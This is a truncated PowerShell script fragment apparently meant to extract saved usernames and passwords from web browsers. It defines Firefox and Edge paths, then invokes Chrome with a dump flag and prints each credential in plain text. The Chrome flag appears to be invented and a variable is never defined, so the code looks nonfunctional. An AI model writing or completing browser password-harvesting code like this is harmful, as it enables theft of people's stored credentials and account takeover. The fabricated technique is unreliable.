$firefoxPath = "C:\Program Files\Mozilla Firefox\firefox.exe"
$edgePath = "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"

# Chrome
try {
    $chromePasswords = & $chromePath --enable-logging --password-save-dump | ConvertFrom-Json
    if ($chromePasswords) {
        foreach ($password in $chromePasswords.passwords) {
            Write-Host "Chrome - Username: $($password.name), Password: $($password.value)"
        }
